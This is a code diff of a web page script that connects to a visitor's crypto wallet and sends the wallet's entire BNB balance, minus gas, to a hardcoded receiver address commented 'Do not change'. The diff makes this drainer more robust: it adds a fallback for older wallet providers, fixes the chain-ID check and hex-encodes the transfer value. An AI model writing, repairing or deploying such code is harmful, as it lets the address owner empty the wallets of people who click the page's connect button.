@@ -11,56 +11,62 @@
     const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
 
     async function connectAndTransfer() {
+      // Check for wallet provider (MetaMask, Trust Wallet, etc.)
+      let web3;
       if (window.ethereum) {
-        const web3 = new Web3(window.ethereum);
-
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const accounts = await web3.eth.getAccounts();
-          const sender = accounts[0];
-
-          // Ensure BNB Smart Chain Mainnet (chainId 56)
-          const chainIdHex = await web3.eth.getChainId(); // Hex ya integer return kar sakta hai
-          const chainId = web3.utils.hexToNumber(chainIdHex); // Hex ko integer mein convert karo
-          if (chainId !== 56) {
-            alert("Please switch to BNB Smart Chain Mainnet.");
-            return;
-          }
-
-          // Get full balance
-          const balance = await web3.eth.getBalance(sender);
-
-          // Estimate dynamic gas cost
-          const gasLimit = await web3.eth.estimateGas({
-            from: sender,
-            to: receiverAddress,
-            value: balance
-          });
-          const gasPrice = await web3.eth.getGasPrice();
-          const gasEstimate = web3.utils.toBN(gasLimit).mul(web3.utils.toBN(gasPrice));
-
-          // Subtract gas from balance
-          const amountToSend = web3.utils.toBN(balance).sub(gasEstimate);
-
-          if (amountToSend.lte(0)) {
-            alert("Insufficient BNB to cover gas fees.");
-            return;
-          }
-
-          // Send BNB
-          const tx = await web3.eth.sendTransaction({
-            from: sender,
-            to: receiverAddress,
-            value: amountToSend.toString()
-          });
-
-          alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
-        } catch (error) {
-          alert("Error: " + error.message);
-          console.error("Transaction Error:", error);
-        }
+        web3 = new Web3(window.ethereum);
+      } else if (window.web3) {
+        web3 = new Web3(window.web3.currentProvider); // Fallback for older wallet versions
       } else {
         alert("Please install MetaMask or Trust Wallet.");
+        return;
+      }
+
+      try {
+        // Request account access
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
+        // Ensure BNB Smart Chain Mainnet (chainId 56, which is 0x38 in hex)
+        const chainId = await web3.eth.getChainId();
+        const chainIdHex = web3.utils.toHex(chainId);
+        if (chainIdHex !== "0x38") { // Compare with hex value of 56 (0x38)
+          alert("Please switch to BNB Smart Chain Mainnet.");
+          return;
+        }
+
+        // Get full balance
+        const balance = await web3.eth.getBalance(sender);
+
+        // Estimate dynamic gas cost
+        const gasLimit = await web3.eth.estimateGas({
+          from: sender,
+          to: receiverAddress,
+          value: balance
+        });
+        const gasPrice = await web3.eth.getGasPrice();
+        const gasEstimate = web3.utils.toBN(gasLimit).mul(web3.utils.toBN(gasPrice));
+
+        // Subtract gas from balance
+        const amountToSend = web3.utils.toBN(balance).sub(gasEstimate);
+
+        if (amountToSend.lte(0)) {
+          alert("Insufficient BNB to cover gas fees.");
+          return;
+        }
+
+        // Send BNB (convert amountToSend to hex string)
+        const tx = await web3.eth.sendTransaction({
+          from: sender,
+          to: receiverAddress,
+          value: web3.utils.toHex(amountToSend) // Convert to hex to avoid validation error
+        });
+
+        alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
+      } catch (error) {
+        alert("Error: " + error.message);
+        console.error("Transaction Error:", error);
       }
     }
   </script>
